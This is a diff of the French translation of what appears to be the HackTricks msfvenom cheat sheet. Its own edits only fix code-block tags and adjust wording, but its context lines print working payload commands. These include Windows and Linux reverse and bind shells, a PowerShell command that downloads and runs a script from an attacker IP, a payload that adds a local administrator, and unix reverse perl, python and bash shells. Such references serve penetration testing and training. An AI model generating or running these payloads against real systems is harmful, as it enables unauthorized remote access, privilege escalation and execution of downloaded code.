@@ -92,6 +92,8 @@ msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ex
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
 ```
+{% endcode %}
+
 ### Encodeur
 
 {% code overflow="wrap" %}
@@ -125,6 +127,8 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
 ```bash
 msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
 ```
+{% endcode %}
+
 ### SunOS (Solaris)
 
 {% code overflow="wrap" %}
@@ -133,7 +137,7 @@ msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTAC
 ```
 {% endcode %}
 
-## **Charge utiles MAC**
+## **Charge utile MAC**
 
 ### **Shell inversé :**
 
@@ -166,7 +170,7 @@ cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> s
 
 ### ASP/x
 
-#### Reverse shell
+#### Shell inversée
 
 {% code overflow="wrap" %}
 ```bash
@@ -213,8 +217,6 @@ msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > 
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
 ```
-{% endcode %}
-
 ### **Bash**
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
@@ -232,7 +234,7 @@ Engagez-vous avec du contenu qui explore le frisson et les défis du hacking
 Restez à jour avec le monde du hacking en rapide évolution grâce à des nouvelles et des aperçus en temps réel
 
 **Dernières annonces**\
-Restez informé des nouveaux programmes de bug bounty lancés et des mises à jour cruciales des plateformes
+Restez informé des nouvelles primes de bugs lancées et des mises à jour cruciales des plateformes
 
 **Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez à collaborer avec les meilleurs hackers dès aujourd'hui !
 
@@ -245,7 +247,7 @@ Apprenez et pratiquez le hacking GCP : <img src="../../.gitbook/assets/grte.png"
 <summary>Soutenir HackTricks</summary>
 
 * Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
